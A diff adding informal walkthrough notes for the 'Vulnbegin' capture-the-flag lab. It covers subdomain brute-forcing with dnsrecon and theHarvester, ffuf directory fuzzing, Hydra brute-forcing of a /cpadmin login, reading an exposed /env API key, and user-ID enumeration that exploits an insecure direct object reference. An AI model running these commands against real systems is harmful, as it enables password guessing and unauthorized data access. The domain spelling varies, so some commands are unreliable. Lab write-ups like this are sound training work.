@@ -1,0 +1,89 @@
+Vulnbegin :-
+ - Check Cookies and set Otherwise Click on beign so not need to set
+ - Check Website, Page Source code and View comment
+ - Check Custom Javascript
+ 
+Find DNS Complete information :- nslookup -type=any vlunbegin.co.uk 8.8.8.8
+
+Find Sub-Domain :-
+ Brute-force :- 
+  - Try Different word to find other page of website 
+  - IF it status code 200 in response means we finded 
+  Tools :- 
+   - dnsrecon -d vlunbegin.co.uk -D /wordlists/subdomains.txt -t brt  (Wordlist by default provided by CTFChallage)
+   - One finded subdomains :- server.vlunbegin.co.uk
+   - curl server.vlunbegin.co.uk :- gives error that cookie not set
+   - Set cookie :- curl server.vlunbegin.co.uk -H "Cookie: $cookie"   (Cookie set in $cookie variable)
+   - Error : user not authenticated  | and flag
+   - If you pass cookie value means u authenticated 
+            
+
+ OsINT Way   :- 
+  - Search in google about domain 
+  Tools :-
+   theHarvester -d vulnbegin.co.uk -b all   (-d Domain | -b from which you need to get data)
+   - new Subdomain Found 
+   - curl v64hss83.vlunbegin.co.uk -H "Cookie: $cookie"
+
+
+
+Find End-Point / Directory Buster of Domain :-
+ Tools :- ffuf
+  ffuf -w /wordlists/content.txt -t 2 -p 0.1 -H "Cookie: $cookie" (Use maximum 2 thrad otherwise ban | -p waiting time between | Cookie)
+  -u "http:vlunbegin.co.uk/FUZZ" 
+
+  - Four Endpoint finded :- cpadmin | css | js | robots.txt
+  cpadmin :- 
+   - Redirect to login | Ask Username and password
+   - It show Username is invalid so we can try Different username on it 
+   - When it shows Different types of error it useful for that finding user on website
+  
+  robots.txt :- 
+   - Secret_directory
+
+ Tools :- Hydra
+  hydra -L /wordlists/usernames.txt -p abcd vlunbegin.co.uk http-post-form  "/cpadmin/login:username=^USER^&password=^PASS^:
+  F=Username is invalid:H=Cookie: $cookie" -f -t 1
+
+  - admin name finded | username invalid error gone so now bruteforce on password
+  - Now bruteforce on password
+
+  hydra -L admin -p /wordlists/passwords.txt vlunbegin.co.uk http-post-form  "/cpadmin/login:username=^USER^&password=^PASS^:
+  F=Password is invalid:H=Cookie: $cookie" -f -t 1  
+  
+  - password :- 159753
+  - When login view page source and find 
+
+  - If we login successfully we have cookies and token 
+  - inspect -> application -> we have token and cookie -> till token we can stay on admin page 
+
+  - Now again dir bust on cpadmin because till it Redirect to login page
+
+  ffuf :-
+   - Fuzzing again 
+   - ffuf -w /wordlists/content.txt -t 2 -p 0.1 -H "Cookie: token= ; $cookie" -u http://vlunbegin.co.uk/cpadmin/FUZZ
+   - finded :- login, logout, env
+
+   - browser /env 
+   - api_key finded and flag
+   - X-Token :- Used in header not in Cookie | Defined by Http Protocol 
+
+  - Add Header in Request 
+  Mode Header Extension :- Add Header in Request
+   - Not finded anything
+
+  Go in Server domain :-
+   - Message  :- User authenticated
+   - ffuf -w /wordlists/content.txt -t 2 -p 0.1 -H "X-Token: " -H"Cookie: " -u http://server.vlunbegin.co.uk/FUZZ
+   - robots.txt and USER
+   - robots.txt :- Secret_directory
+   - user :- id - 27 and Endpoint 
+   server.vlunbegin.co.uk/user/27/info
+
+   - Id bruteforce to find other user details
+   seq 1 100 | ffuf -w - -t 2 -p 0.1 -H "X-Token: " -H"Cookie: " -u http://server.vlunbegin.co.uk/user/FUZZ
+   - 5 id - you donot have permission to view this user 
+   - 5/info and we get all flag (Insecure direct Object Reference vulnerability / Access Control ) - Tamper Parameter  
+   - I am 27 user but i can view user 5 data also
+
+     
